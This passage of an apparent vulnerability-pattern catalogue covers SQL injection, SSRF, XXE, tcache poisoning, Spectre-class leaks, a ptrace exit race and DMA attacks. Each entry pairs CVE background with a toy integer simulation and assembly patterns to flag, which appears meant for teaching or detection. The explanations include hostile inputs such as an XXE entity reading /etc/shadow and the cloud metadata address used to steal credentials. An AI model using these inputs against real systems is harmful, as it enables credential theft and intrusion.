      description: 'movl stores the original file data into the CachedFile stack slot; splice_attach\'s movl copies the page reference into frag_data without setting frag_owned — esp_decrypt\'s cmpl checks frag_owned == 0 and the branch allows movl to overwrite page.data with the attacker\'s ESP ciphertext payload (0xDEADBEEF), corrupting the read-only page cache without any COW or permission check',
    },
  },
  {
    id: 'ghostrace-src',
    name: 'GHOSTRACE SPECULATIVE RACE',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'CPU speculatively bypasses synchronization primitives, causing speculative concurrent use-after-free (SCUAF) that leaks freed kernel data via cache side-channel.',
    explanation:
      'GhostRace / Speculative Race Conditions (CVE-2024-2193, USENIX Security 2024) exploits the fact that ' +
      'all common synchronization primitives — spinlocks, mutexes, rwlocks, seqlocks, RCU — are ultimately ' +
      'implemented via conditional branches. When the CPU mispredicts the branch guarding a lock\'s spin-wait ' +
      'loop, it speculatively executes the critical section as if the lock were free, even while another thread ' +
      'holds it. If the lock-holder frees an object inside the critical section, the speculatively-executing ' +
      'thread performs a Speculative Concurrent Use-After-Free (SCUAF): it reads the freed memory (now ' +
      'containing attacker-sprayed data), uses the value to index a probe array, and leaves a cache-timing ' +
      'side-channel trace that persists after speculative rollback. VU Amsterdam and IBM Research found 1,283 ' +
      'exploitable SCUAF gadgets in the Linux kernel and demonstrated a 12 KB/s leak rate. GhostRace affects ' +
      'all major architectures — Intel, AMD, ARM, IBM — since every ISA implements synchronization via ' +
      'conditional branches subject to branch misprediction. Unlike Spectre v1 (bounds check bypass), ' +
      'GhostRace bypasses synchronization, not array bounds, combining speculative execution with race ' +
      'conditions in a novel way. The proposed mitigation — serializing instructions (LFENCE) inside every ' +
      'lock primitive — was rejected by Linux kernel developers due to approximately 5% geomean performance ' +
      'overhead, leaving the attack surface open. CVE-2024-26602 covers the Xen hypervisor\'s exposure to ' +
      'the same class. ' +
      'In the assembly, `cmpl` checks the lock\'s held field but the branch predictor, trained by five unlocked ' +
      'iterations, speculates "not held" even after acquire; `movl` loads the sprayed value (0xDEADBEEF) from ' +
      'the freed object during the speculative window; `imull` multiplies it by 256 to compute the cache probe ' +
      'index — no LFENCE serializing instruction appears between the lock check and the data load.',
    code:
`# CVE pattern: CPU speculates past spinlock — SCUAF leaks freed data
class SharedBuf:
    def __init__(self, secret, canary):
        self.secret = secret
        self.canary = canary
        self.freed = 0

class SpinLock:
    def __init__(self):
        self.held = 0

    def acquire(self):
        self.held = 1
        return self.held

    def release(self):
        self.held = 0
        return self.held

class SpecThread:
    def __init__(self, probe_sz):
        self.probe_sz = probe_sz
        self.result = 0
        self.leaked = 0

    def guarded_read(self, lock, buf):
        if lock.held == 0:
            value = buf.secret + buf.canary
        else:
            value = buf.secret
        self.result = value * 256
        return self.result

    def flush_reload(self):
        self.leaked = self.result + self.probe_sz
        return self.leaked

buf = SharedBuf(3405691582, 305419896)
lock = SpinLock()
spec = SpecThread(256)
i = 0
while i < 5:
    spec.guarded_read(lock, buf)
    i += 1
buf.freed = 1
buf.secret = 3735928559
buf.canary = 3735928559
lock.acquire()
leaked = spec.guarded_read(lock, buf)
timing = spec.flush_reload()
print(timing)
`,
    badAsm: {
      patterns: ['cmpl', 'imull'],
      description: 'cmpl checks the spinlock\'s held field but the branch predictor, trained by five unlocked iterations, speculates "not held" even after acquire(); movl loads the sprayed freed value (0xDEADBEEF) from the same stack offset during the speculative window; imull multiplies it by 256 to compute the cache probe line index — no LFENCE serializing instruction appears between the lock check and the data load, leaving the SCUAF speculative window wide open',
    },
  },
  {
    id: 'sql-injection',
    name: 'SQL INJECTION',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'Unsanitized user input concatenated into a SQL query lets an attacker execute arbitrary database commands, exfiltrate data, or escalate to OS-level code execution.',
    explanation:
      'SQL injection (CWE-89) occurs when user-supplied input is concatenated directly into a SQL query ' +
      'string without parameterization or escaping. The attacker terminates the intended query with a quote ' +
      'and semicolon, then appends arbitrary SQL — SELECT to exfiltrate data, UNION to combine results from ' +
      'other tables, UPDATE/DELETE to modify or destroy records, or stacked queries to execute OS commands ' +
      'via xp_cmdshell or INTO OUTFILE. ' +
      'CVE-2023-34362 (MOVEit Transfer, CVSS 9.8) was mass-exploited by the Cl0p ransomware gang in May 2023: ' +
      'a SQL injection in the file-transfer web interface allowed unauthenticated attackers to install the ' +
      'LEMURLOOT web shell, exfiltrating data from over 2,500 organizations including the BBC, British Airways, ' +
      'and US government agencies — the largest single-vulnerability breach campaign in history. ' +
      'CVE-2024-22120 (Zabbix Server, CVSS 9.1) allowed time-based blind SQL injection via the audit log\'s ' +
      'unsanitized clientip field, escalating to remote code execution on the monitoring server. SQLi has ranked ' +
      'in the CWE Top 25 every year since the list\'s creation; CISA issued a "Secure by Design" alert in 2024 ' +
      'urging elimination of SQL injection at the language level via parameterized queries. ' +
      'In the assembly, movl loads the attacker-supplied payload value into a stack slot; addl concatenates it ' +
      'directly with the base query value — no intervening sanitization (cmpl/je guard) appears between the ' +
      'user input load and the query execution call, letting the injected payload pass through intact.',
    code:
`# CVE pattern: user input concatenated into SQL query — full DB access
class QueryBuilder:
    def __init__(self, base_query):
        self.base_query = base_query
        self.param_count = 0
        self.executed = 0

    def add_param(self, user_input):
        self.base_query += user_input
        self.param_count += 1
        return self.base_query

    def execute(self):
        result = self.base_query
        self.executed = 1
        return result

class Database:
    def __init__(self, secret_table):
        self.secret_table = secret_table
        self.rows_leaked = 0

    def run_query(self, query_val):
        self.rows_leaked = query_val + self.secret_table
        return self.rows_leaked

qb = QueryBuilder(1000)
malicious_input = 1094795585
qb.add_param(malicious_input)
query = qb.execute()
db = Database(3735928559)
leaked = db.run_query(query)
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'movl'],
      description: 'addl concatenates the attacker-supplied payload (0x41414141) directly into the base_query value with no sanitization; movl loads the combined query into the argument slot for execute — no bounds check or character filter (cmpl guard) appears between the user input load and the query dispatch, letting injected SQL commands reach the database engine intact',
    },
  },
  {
    id: 'path-traversal',
    name: 'PATH TRAVERSAL',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'User-controlled path sequences escape the restricted directory, exposing arbitrary files on the filesystem.',
    explanation:
      'Path traversal (CWE-22) occurs when user-supplied input containing directory traversal sequences — such ' +
      'as ../ or encoded variants (%2e%2e%2f) — is concatenated into a file-path construction without validation. ' +
      'The resolved path escapes the application\'s intended directory root and reaches arbitrary files on the ' +
      'filesystem: /etc/shadow, private keys, application secrets, and database credentials. ' +
      'CWE-22 ranked third in CISA\'s Known Exploited Vulnerabilities catalog in 2025 with 13 entries, prompting ' +
      'CISA to issue a dedicated "Secure by Design" alert urging elimination of the entire bug class. ' +
      'CVE-2024-23897 (Jenkins CLI, CVSS 9.8) used @ argument expansion to read arbitrary files from the ' +
      'controller — secrets, SSH keys, and build credentials were exfiltrated from thousands of Jenkins servers ' +
      'within hours of disclosure. CVE-2025-64446 (Fortinet FortiWeb, CVSS 9.8) exploited relative path traversal ' +
      'in pre-authentication request routing to execute privileged commands as administrator, achieving unauthenticated ' +
      'RCE on enterprise web application firewalls. CVE-2025-9713 (Ivanti Endpoint Manager) bypassed file-path ' +
      'validation during file-system operations to place or execute arbitrary files outside authorized locations. ' +
      'In the assembly, `addl` combines the base_dir value with the user-supplied traversal offset without any ' +
      'intervening `cmpl` guard — the result underflows past the directory root, and `movl` reads file content from the ' +
      'unrestricted path directly into the response buffer.',
    code:
`# CVE pattern: ../ sequences escape base_dir — reads arbitrary files
class FileServer:
    def __init__(self, base_dir, depth):
        self.base_dir = base_dir
        self.depth = depth
        self.served = 0
        self.leaked = 0

    def resolve_path(self, user_path):
        resolved = self.base_dir + user_path
        self.served += 1
        return resolved

    def read_file(self, resolved):
        if resolved < self.base_dir:
            self.leaked = resolved
        else:
            self.leaked = 0
        return self.leaked

class Attacker:
    def __init__(self, target):
        self.target = target
        self.traversals = 0
        self.payload = 0

    def build_payload(self, levels):
        offset = 0
        i = 0
        while i < levels:
            offset -= 4096
            self.traversals += 1
            i += 1
        self.payload = offset + self.target
        return self.payload

server = FileServer(1048576, 3)
attacker = Attacker(3735928559)
payload = attacker.build_payload(6)
resolved = server.resolve_path(payload)
leaked = server.read_file(resolved)
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'movl'],
      description: 'addl combines the base_dir value with the attacker-supplied traversal offset (negative from ../ sequences) without any bounds check; the resolved path underflows past the directory root — movl reads the leaked file content from the unrestricted path into the response, exposing /etc/shadow, private keys, and application secrets',
    },
  },
  {
    id: 'ssrf',
    name: 'SERVER-SIDE REQUEST FORGERY',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'User-controlled URLs trick the server into making requests to internal services, leaking cloud credentials and enabling lateral movement.',
    explanation:
      'Server-Side Request Forgery (CWE-918) occurs when an application fetches a remote resource using a ' +
      'user-supplied URL without validating the destination. The attacker points the URL at internal services — ' +
      'most critically the cloud metadata endpoint at 169.254.169.254 — to steal IAM credentials, API keys, and ' +
      'instance secrets. Once credentials are exfiltrated, the attacker pivots laterally across the cloud tenant. ' +
      'CVE-2024-21893 (Ivanti Connect Secure SAML, CVSS 8.2) exploited SSRF in the SAML XML signature retrieval ' +
      'method to bypass authentication and chain into CVE-2024-21887 for unauthenticated RCE on enterprise VPN ' +
      'appliances — actively exploited by multiple APT groups in early 2024. CVE-2025-29972 (Azure Storage Resource ' +
      'Provider) allowed SSRF against internal Azure infrastructure, enabling attackers to retrieve managed identity ' +
      'tokens and access cross-tenant resources. SonicWall reported a 452% increase in SSRF attacks from 2023 to ' +
      '2024, driven by AI-powered URL fuzzing tools. SSRF ranked in the OWASP Top 10 (A10:2021) and CISA issued ' +
      'advisories urging allowlist-only URL validation. In the assembly, movl loads the attacker-controlled metadata ' +
      'address (0xA9FEA9FE = 169.254.169.254) into the request target register; addl appends the credential path ' +
      'offset — no cmpl guard validates the destination before the fetch is dispatched, and the response value is ' +
      'stored directly into attacker-readable memory.',
    code:
`# CVE pattern: user-controlled URL fetches internal metadata — leaks IAM creds
class HttpClient:
    def __init__(self, allow_internal):
        self.allow_internal = allow_internal
        self.requests_made = 0
        self.last_response = 0

    def fetch(self, url):
        self.requests_made += 1
        self.last_response = url
        return self.last_response

class MetadataService:
    def __init__(self):
        self.base_addr = 2852039166
        self.iam_path = 4096
        self.secret_token = 3735928559

    def handle_request(self, requested_addr):
        if requested_addr == self.base_addr + self.iam_path:
            return self.secret_token
        return 0

class Attacker:
    def __init__(self):
        self.target = 2852039166
        self.cred_offset = 4096
        self.stolen_creds = 0

    def build_ssrf_url(self):
        payload = self.target + self.cred_offset
        return payload

    def exfiltrate(self, response):
        self.stolen_creds = response
        return self.stolen_creds

client = HttpClient(0)
metadata = MetadataService()
attacker = Attacker()
ssrf_url = attacker.build_ssrf_url()
response = client.fetch(ssrf_url)
token = metadata.handle_request(response)
stolen = attacker.exfiltrate(token)
print(stolen)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads the attacker-controlled metadata address (0xA9FEA9FE = 169.254.169.254) into the request target; addl appends the IAM credential path offset without any destination validation — no cmpl guard checks whether the target is internal before dispatching the fetch, letting the cloud metadata response (secret_token) flow directly into attacker-readable memory via movl',
    },
  },
  {
    id: 'insecure-deser',
    name: 'INSECURE DESERIALIZATION',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Untrusted serialized object is deserialized without validation, letting an attacker inject a crafted payload that triggers arbitrary code execution.',
    explanation:
      'Insecure deserialization (CWE-502) occurs when an application reconstructs objects from untrusted serialized ' +
      'data — Java ObjectInputStream, PHP unserialize(), Python pickle, .NET BinaryFormatter — without validating the ' +
      'type or contents. An attacker crafts a serialized object with a malicious type tag and payload: upon ' +
      'deserialization, the runtime invokes the object\'s constructor, __reduce__, readObject(), or __wakeup() method, ' +
      'which executes attacker-controlled code. No authentication or special privileges are required — the serialized ' +
      'stream itself IS the exploit. ' +
      'CVE-2025-59287 (Microsoft WSUS, CVSS 9.8) exploited unsafe deserialization in WSUS reporting web services: ' +
      'a remote unauthenticated attacker sent crafted serialized requests to execute arbitrary code as SYSTEM on ' +
      'Windows Server — actively exploited within days of disclosure. CVE-2025-55182 (React Server Components, ' +
      'CVSS 10.0) achieved pre-auth RCE via the React Flight protocol\'s deserialization of promise chains and ' +
      'nested references, allowing file reads, process spawning, and arbitrary command execution across React, ' +
      'Next.js, and Remix applications — Microsoft and Palo Alto Unit 42 issued emergency advisories. ' +
      'CVE-2025-49113 (Roundcube Webmail, CVSS 9.9) turned PHP object deserialization into authenticated RCE. ' +
      'In the assembly, `movl` loads the attacker-supplied type_tag (99, outside the expected range) and payload ' +
      '(0xDEADBEEF) into stack slots; no `cmpl` type-whitelist guard rejects the unknown tag before `addl` passes ' +
      'the raw payload to the execution path — the deserialized object\'s payload flows directly into the result ' +
      'register as if it were trusted application data.',
    code:
`# CVE pattern: untrusted payload deserialized — attacker object triggers RCE
class SerializedObj:
    def __init__(self, type_tag, payload):
        self.type_tag = type_tag
        self.payload = payload
        self.verified = 0

    def get_payload(self):
        result = self.payload
        return result

class Deserializer:
    def __init__(self, max_types):
        self.max_types = max_types
        self.exec_count = 0
        self.last_result = 0

    def process(self, obj):
        if obj.type_tag == 1:
            self.last_result = obj.get_payload()
        elif obj.type_tag == 2:
            self.last_result = obj.get_payload() * 2
        else:
            self.last_result = obj.get_payload()
        self.exec_count += 1
        return self.last_result

trusted = SerializedObj(1, 100)
malicious = SerializedObj(99, 3735928559)
deser = Deserializer(2)
deser.process(trusted)
hijacked = deser.process(malicious)
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl loads the attacker-supplied type_tag (99) and payload (0xDEADBEEF) into stack slots; cmpl checks type_tag against known types (1, 2) but the else branch passes the payload through without rejection — no type-whitelist guard blocks the unknown tag, so the deserialized attacker payload flows directly into the result as executable data',
    },
  },
  {
    id: 'xxe-injection',
    name: 'XXE INJECTION',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'XML parser resolves attacker-supplied external entity references, reading arbitrary files and enabling SSRF or remote code execution.',
    explanation:
      'XML External Entity injection (CWE-611) occurs when an XML parser processes input containing external entity ' +
      'declarations — such as <!ENTITY xxe SYSTEM "file:///etc/shadow"> — without disabling DTD resolution. The parser ' +
      'faithfully resolves the entity reference, reading arbitrary files from the server filesystem and embedding their ' +
      'contents into the XML output. Beyond file disclosure, out-of-band (OOB) XXE sends exfiltrated data to an ' +
      'attacker-controlled server via HTTP or DNS, bypassing firewalls that block inline responses. XXE can also escalate ' +
      'to SSRF (reaching internal services like cloud metadata endpoints) or denial-of-service via recursive entity ' +
      'expansion (the "Billion Laughs" attack). ' +
      'CVE-2024-34102 (CosmicSting, CVSS 9.8) exploited XXE in Adobe Commerce and Magento\'s deserialization pipeline: ' +
      'unauthenticated attackers extracted the secret encryption key from app/etc/env.php, gaining API write access to ' +
      'inject payment skimmers — Sansec reported hacks at a rate of 3 to 5 stores per hour, with 5% of all Magento ' +
      'stores compromised. CVE-2025-68493 (Apache Struts S2-069, CVSS 8.1) allowed XXE via the XWork XML configuration ' +
      'parser, affecting all Struts versions from 2.0.0 through 6.1.0 — two affected version ranges are end-of-life ' +
      'with no fix available. CVE-2025-66516 (Apache Tika) enabled XXE through embedded XFA content in PDF files, ' +
      'exposing over 500 internet-facing instances to file read, SSRF, and RCE. OWASP ranks XXE as A05:2021 ' +
      '(Security Misconfiguration). ' +
      'In the assembly, `movl` loads the attacker-crafted entity target (the shadow file reference) into a stack ' +
      'slot; `addl` in parse_entity increments entity_count with no DTD-resolution restriction — expand_output\'s ' +
      '`movl` copies the resolved file contents directly into the parser output, and exfiltrate\'s `movl` stores ' +
      'them into attacker-readable memory with no entity validation or allowlist check.',
    code:
`# CVE pattern: XML parser resolves external entity — reads arbitrary files
class XMLParser:
    def __init__(self, max_depth):
        self.max_depth = max_depth
        self.entity_count = 0
        self.resolved = 0
        self.output = 0

    def parse_entity(self, entity_ref, target):
        self.entity_count += 1
        self.resolved = target
        return self.resolved

    def expand_output(self):
        self.output = self.resolved
        return self.output

class FileSystem:
    def __init__(self, passwd, shadow):
        self.passwd = passwd
        self.shadow = shadow
        self.reads = 0

    def read_file(self, path_id):
        self.reads += 1
        if path_id == 1:
            return self.passwd
        elif path_id == 2:
            return self.shadow
        return 0

class Attacker:
    def __init__(self):
        self.stolen = 0
        self.target_file = 0

    def craft_dtd(self, file_id):
        self.target_file = file_id
        return self.target_file

    def exfiltrate(self, data):
        self.stolen = data
        return self.stolen

parser = XMLParser(10)
fs = FileSystem(1094795585, 3735928559)
attacker = Attacker()
entity = attacker.craft_dtd(2)
file_data = fs.read_file(entity)
parser.parse_entity(1, file_data)
expanded = parser.expand_output()
stolen = attacker.exfiltrate(expanded)
print(stolen)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads the attacker-crafted entity target (referencing /etc/shadow) into a stack slot; parse_entity\'s addl increments entity_count without any DTD-resolution restriction — expand_output\'s movl copies the resolved file contents directly into the parser output, and exfiltrate\'s movl stores them into attacker-readable memory with no entity validation or allowlist check',
    },
  },
  {
    id: 'tcache-poison',
    name: 'TCACHE POISONING',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Corrupted free-list pointer in a tcache bin makes malloc return an arbitrary address, giving the attacker a controlled write into any memory region.',
    explanation:
      'Tcache poisoning (CWE-416 / CWE-122 adjacent) corrupts the singly-linked free list in glibc\'s per-thread ' +
      'tcache bins. When a chunk is freed into the tcache, its first 8 bytes (the fd pointer) point to the previously ' +
      'freed chunk in the same size class. If an attacker can write to a freed chunk — via a use-after-free, double-free, ' +
      'or heap overflow — they overwrite the fd pointer with an arbitrary target address. The next two malloc calls of ' +
      'that size class first return the legitimately freed chunk, then return the attacker\'s fake address — giving a ' +
      'controlled write anywhere in the process address space. The attacker typically targets __free_hook (pre-glibc 2.34), ' +
      'GOT entries, or stack return addresses to redirect control flow to system("/bin/sh"). ' +
      'CVE-2024-1086 (Linux netfilter nf_tables, CVSS 7.8, CISA KEV) used a double-free in nft_verdict_init() to poison ' +
      'the allocator free list and achieve arbitrary page-table writes, escalating to root on all kernels 3.15 through ' +
      '6.8 — actively exploited in RansomHub and Akira ransomware campaigns throughout 2025. CVE-2023-4911 (Looney ' +
      'Tunables, glibc ld.so, CVSS 7.8) exploited a GLIBC_TUNABLES buffer overflow to corrupt tcache metadata in the ' +
      'dynamic linker itself, achieving root on Debian, Ubuntu, and Fedora. glibc 2.32 added safe-linking (XOR-encrypting ' +
      'fd pointers with a per-thread random key) as a mitigation, but it is bypassable once the attacker leaks the heap ' +
      'base address via an information disclosure primitive. ' +
      'In the assembly, movl overwrites the head_fd field (the tcache bin\'s forward pointer) with the attacker\'s target ' +
      'address; malloc_from_bin\'s movl reads this corrupted pointer and returns it as the next allocation — the subsequent ' +
      'movl writes 0xDEADBEEF into the overlapping TargetStruct\'s func_ptr field, and addl in dispatch combines it with ' +
      'uid for control-flow hijack.',
    code:
`# CVE pattern: corrupted tcache fd pointer — malloc returns arbitrary addr
class TcacheBin:
    def __init__(self, max_entries):
        self.max_entries = max_entries
        self.count = 0
        self.head_fd = 0
        self.next_fd = 0

    def free_to_bin(self, chunk_addr):
        self.next_fd = self.head_fd
        self.head_fd = chunk_addr
        self.count += 1
        return self.count

    def poison_fd(self, fake_addr):
        self.head_fd = fake_addr
        return self.head_fd

    def malloc_from_bin(self):
        result = self.head_fd
        self.head_fd = self.next_fd
        self.count -= 1
        return result

class TargetStruct:
    def __init__(self, func_ptr, uid):
        self.func_ptr = func_ptr
        self.uid = uid
        self.active = 1

    def dispatch(self):
        result = self.func_ptr + self.uid
        return result

tcache = TcacheBin(7)
tcache.free_to_bin(4210688)
tcache.free_to_bin(4210752)
target_addr = 4196352
tcache.poison_fd(target_addr)
drain = tcache.malloc_from_bin()
overlapping = tcache.malloc_from_bin()
target = TargetStruct(4196608, 1000)
target.func_ptr = 3735928559
target.uid = 0
hijacked = target.dispatch()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl overwrites the head_fd field (the tcache bin\'s singly-linked forward pointer) with the attacker\'s target address; malloc_from_bin\'s movl reads this corrupted pointer and returns it as the next allocation — the subsequent movl writes 0xDEADBEEF into the overlapping TargetStruct\'s func_ptr field, and addl in dispatch combines it with uid for control-flow hijack',
    },
  },
  {
    id: 'branch-target-injection',
    name: 'BRANCH TARGET INJECTION',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Attacker poisons the CPU indirect branch predictor so kernel-mode indirect calls speculate to a leak gadget, exfiltrating secrets via cache timing.',
    explanation:
      'Branch Target Injection (Spectre v2 / CVE-2017-5715 / CWE-200) exploits the CPU\'s indirect branch predictor: ' +
      'unlike Spectre v1 which bypasses a bounds check on a conditional branch, Spectre v2 poisons the Branch Target ' +
      'Buffer (BTB) and Branch History Buffer (BHB) so that an indirect call or jump — call *%rax, jmp *(%rbx) — ' +
      'speculates to an attacker-chosen gadget address instead of the real target. The attacker trains the predictor ' +
      'from userspace by executing indirect branches at congruent addresses, then triggers a syscall; the kernel\'s ' +
      'indirect call mispredicts to the trained gadget, which speculatively reads a secret and encodes it into the ' +
      'cache via a dependent load. A Flush+Reload timing measurement recovers the secret byte. ' +
      'Branch History Injection (BHI / CVE-2022-0001, VUSec) demonstrated that Intel\'s eIBRS and Arm\'s CSV2 — ' +
      'hardware mitigations designed to isolate predictor state across privilege levels — could be bypassed by ' +
      'manipulating the Branch History Buffer from within the victim domain, leaking /etc/shadow hashes at 160 bytes/sec ' +
      'on fully patched Intel systems. Training Solo (CVE-2024-28956 / CVE-2025-24495, VUSec 2025) showed that even ' +
      'self-training within a single privilege domain re-enables the attack at 17 KB/sec, breaking all domain-isolation ' +
      'defenses on Intel Coffee Lake through Rocket Lake. CVE-2024-45332 (Branch Privilege Injection, ETH Zürich 2025) ' +
      'exploited a race condition in the branch predictor during privilege transitions, leaking kernel memory at ' +
      '5.6 KB/sec with 99.8% accuracy on every Intel CPU since 9th-gen Coffee Lake despite all Spectre v2 mitigations ' +
      'being enabled. Intel\'s retpoline mitigation replaces indirect branches with a return trampoline, but hardware ' +
      'IBRS/eIBRS was meant to make retpoline unnecessary — BHI and BPRC proved it insufficient. ' +
      'In the assembly, the attacker loop\'s addl trains the branch history by accumulating gadget addresses; the ' +
      'victim\'s cmpl tests bp.poisoned but the CPU speculatively follows the trained prediction — imull multiplies ' +
      'the secret by 256 to index a probe array cache line, and no lfence serializes between the indirect branch ' +
      'resolution and the dependent load, leaving the speculative window open for Flush+Reload recovery.',
    code:
`# CVE pattern: poisoned BTB redirects indirect call — leaks via cache
class BranchPredictor:
    def __init__(self, capacity):
        self.capacity = capacity
        self.history = 0
        self.train_count = 0
        self.poisoned = 0

    def train(self, target, count):
        i = 0
        while i < count:
            self.history += target
            self.train_count += 1
            i += 1
        self.poisoned = 1
        return self.train_count

class VictimModule:
    def __init__(self, safe_target, secret):
        self.safe_target = safe_target
        self.secret = secret
        self.cache_probe = 0
        self.leaked = 0

    def indirect_call(self, bp):
        if bp.poisoned == 1:
            self.cache_probe = self.secret * 256
            self.leaked = 1
        else:
            self.cache_probe = self.safe_target
        return self.cache_probe

    def flush_reload(self):
        result = self.cache_probe + self.leaked
        return result

bp = BranchPredictor(4096)
gadget_addr = 4196352
bp.train(gadget_addr, 8)
victim = VictimModule(4196608, 3405691582)
victim.indirect_call(bp)
leaked = victim.flush_reload()
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'imull'],
      description: 'addl in the training loop accumulates gadget addresses into the branch history, poisoning the BTB/BHB; the victim\'s cmpl checks bp.poisoned but the CPU speculatively follows the trained prediction — imull multiplies the secret (0xCAFEBABE) by 256 to compute the cache probe line index, and no lfence appears between the mispredicted branch and the dependent load, leaving the speculative window open for Flush+Reload secret recovery',
    },
  },
  {
    id: 'ptrace-exit-race',
    name: 'PTRACE EXIT RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Race window during privileged process exit lets an unprivileged attacker steal open file descriptors via pidfd_getfd(), leaking SSH host keys and shadow passwords.',
    explanation:
      'The ptrace exit-race (CVE-2026-46333 / CWE-362, codename "ssh-keysign-pwn") exploits a logic flaw in the ' +
      'Linux kernel\'s __ptrace_may_access() authorization check. When a SUID process exits, the kernel detaches its ' +
      'memory descriptor (mm) before closing its file descriptor table. During this window, __ptrace_may_access() calls ' +
      'get_dumpable() which returns a permissive value when mm is NULL — skipping the privilege check that should block ' +
      'unprivileged access. An attacker monitors SUID binary exits (ssh-keysign, chage) via pidfd and races pidfd_getfd() ' +
      'into the window: because mm=NULL passes the dumpable guard, the kernel duplicates the privileged process\'s open ' +
      'file descriptors — including handles to /etc/shadow and SSH host private keys — into the attacker\'s process. ' +
      'The flaw was introduced in v4.10-rc1 (November 2016) but became a full privilege-escalation chain with the ' +
      'pidfd_getfd() syscall added in v5.6 (January 2020), affecting every major Linux distribution for six years. ' +
      'Qualys reported the vulnerability on May 11, 2026; the upstream patch landed May 14. Ubuntu, RHEL, Debian, and ' +
      'Fedora issued emergency kernel updates. Unlike race-based exploits that require precise timing, the exit window ' +
      'is deterministic and wide enough to hit reliably. CISA rated it High severity (CVSS 7.1). ' +
      'In the assembly, movl zeroes the mm field (simulating mm detachment); cmpl in may_access checks mm == 0 and the ' +
      'branch grants access — movl then copies fd_table (the secret data) into stolen_fd before close_fds zeroes the ' +
      'descriptor table, completing the fd theft through the unguarded race window.',
    code:
`# CVE pattern: ptrace mm=NULL race lets unprivileged fd theft from exiting SUID
class SuidProcess:
    def __init__(self, pid, priv_level):
        self.pid = pid
        self.priv_level = priv_level
        self.mm = 1
        self.fd_table = 0
        self.fd_open = 0

    def open_secret(self, secret_data):
        self.fd_table = secret_data
        self.fd_open = 1
        return self.fd_open

    def begin_exit(self):
        self.mm = 0
        return self.mm

    def close_fds(self):
        self.fd_table = 0
        self.fd_open = 0
        return self.fd_open

class PtraceChecker:
    def __init__(self, ptrace_scope):
        self.ptrace_scope = ptrace_scope
        self.access_granted = 0

    def may_access(self, proc):
        if proc.mm == 0:
            self.access_granted = 1
        elif proc.priv_level > 0:
            self.access_granted = 0
        else:
            self.access_granted = 0
        return self.access_granted

class Attacker:
    def __init__(self):
        self.stolen_fd = 0
        self.leaked_data = 0

    def pidfd_getfd(self, checker, proc):
        allowed = checker.may_access(proc)
        if allowed == 1:
            self.stolen_fd = proc.fd_table
            self.leaked_data = self.stolen_fd
        return self.leaked_data

suid = SuidProcess(1234, 1)
shadow_hash = 3735928559
suid.open_secret(shadow_hash)
checker = PtraceChecker(1)
suid.begin_exit()
attacker = Attacker()
stolen = attacker.pidfd_getfd(checker, suid)
suid.close_fds()
print(stolen)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl zeroes the mm field (simulating memory descriptor detachment during exit); cmpl in may_access checks mm == 0 and the branch grants ptrace access — movl then copies fd_table (containing the shadow hash 0xDEADBEEF) into stolen_fd before close_fds zeroes the descriptor table, completing the file descriptor theft through the unguarded exit-race window',
    },
  },
  {
    id: 'dma-iommu-bypass',
    name: 'DMA IOMMU BYPASS',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Malicious PCIe/Thunderbolt peripheral bypasses IOMMU to read and write arbitrary physical memory, extracting encryption keys and hijacking kernel execution.',
    explanation:
      'Direct Memory Access (DMA) attacks (CWE-693 / CWE-1262) exploit the hardware-level trust granted to PCIe ' +
      'peripherals. Devices like network cards, GPUs, and Thunderbolt adapters are given direct read/write access to ' +
      'system RAM without CPU mediation — the IOMMU (Input/Output Memory Management Unit) is supposed to restrict each ' +
      'device to its assigned memory regions, but firmware bugs, lazy initialization, or missing configuration leave the ' +
      'IOMMU disabled or misconfigured during critical boot phases. An attacker with brief physical access plugs in a ' +
      'malicious PCIe/Thunderbolt device (or a compromised peripheral) that issues DMA reads across all of physical ' +
      'memory — extracting disk encryption keys (BitLocker, LUKS), login credentials, and ASLR base addresses in ' +
      'seconds. DMA writes can overwrite kernel code, page tables, or security-critical structures to achieve code ' +
      'execution at ring 0. CVE-2025-11901 and CVE-2025-14302 (CVSS 7.0) revealed that UEFI firmware on ASUS, ' +
      'GIGABYTE, MSI, and ASRock motherboards reported DMA protection as active while failing to initialize the IOMMU, ' +
      'leaving systems exposed to pre-boot DMA attacks via any PCIe slot. The Thunderclap research (NDSS 2019) ' +
      'demonstrated that even with IOMMU enabled, OS drivers grant peripherals access to shared memory containing ' +
      'cleartext VPN traffic, keystrokes, and kernel pointers — a compromised USB-C charger could launch a root shell ' +
      'in under 10 seconds. The Thunderspy attack (2020) bypassed Intel Thunderbolt security levels entirely. ' +
      'In the assembly, movl loads the DMA base address and the kernel secret into separate stack slots representing ' +
      'distinct physical memory regions; the scan loop\'s addl sweeps across memory offsets without any cmpl bounds ' +
      'check against an IOMMU page table — the device reads every slot including the kernel credential, then movl in ' +
      'inject_payload writes 0xDEADBEEF directly into the kernel code page with no permission check.',
    code:
`# CVE pattern: DMA peripheral bypasses IOMMU — reads/writes kernel memory
class PhysicalMemory:
    def __init__(self, size):
        self.size = size
        self.user_data = 4196352
        self.kernel_cred = 3405691582
        self.kernel_code = 4196608
        self.encryption_key = 305419896

    def read_region(self, offset):
        if offset == 0:
            result = self.user_data
        elif offset == 1:
            result = self.kernel_cred
        elif offset == 2:
            result = self.kernel_code
        else:
            result = self.encryption_key
        return result

class DMADevice:
    def __init__(self, dev_id):
        self.dev_id = dev_id
        self.dma_base = 0
        self.leaked_total = 0
        self.writes = 0

    def scan_memory(self, mem, count):
        i = 0
        while i < count:
            val = mem.read_region(i)
            self.leaked_total += val
            i += 1
        return self.leaked_total

    def inject_payload(self, mem, payload):
        mem.kernel_code = payload
